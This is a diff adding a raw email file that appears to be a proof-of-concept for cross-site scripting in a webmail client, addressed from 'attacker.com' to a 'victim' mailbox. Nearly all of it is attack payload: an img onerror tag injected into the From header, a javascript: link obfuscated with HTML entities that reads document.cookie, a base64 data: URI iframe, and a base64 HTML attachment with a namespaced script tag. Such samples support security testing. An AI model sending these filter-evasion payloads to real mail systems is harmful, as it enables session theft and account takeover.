@@ -1,0 +1,27 @@
+From: <"><img src=1 onerror=alert(0)>//@attacker.com>
+Subject: 2131231313131
+To: victim@winmail.com
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+<a href="javasc&NewLine;ript&colon;al&NewLine;ert(doc&NewLine;ument.coo&NewLine;kie)">important file！</a>
+<a href="data:text/html;base64, PGlmcmFtZS9vbmxvYWQ9YWxlcnQoMSk+">secret！</a>
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: text/html; name="test.xml"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="test.xml"
+
+Jmx0O2h0bWwmZ3Q7DQombHQ7aGVhZCZndDsmbHQ7L2hlYWQmZ3Q7DQombHQ7Ym9keSZndDsNCiZsdDtzb21ldGhpbmc6c2NyaXB0IHhtbG5zOnNvbWV0aGluZz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCImZ3Q7YWxlcnQoMSkmbHQ7L3NvbWV0aGluZzpzY3JpcHQmZ3Q7DQombHQ7L2JvZHkmZ3Q7DQombHQ7L2h0bWwmZ3Q7
+------=_Part_192061_1556421578.1563869810627--
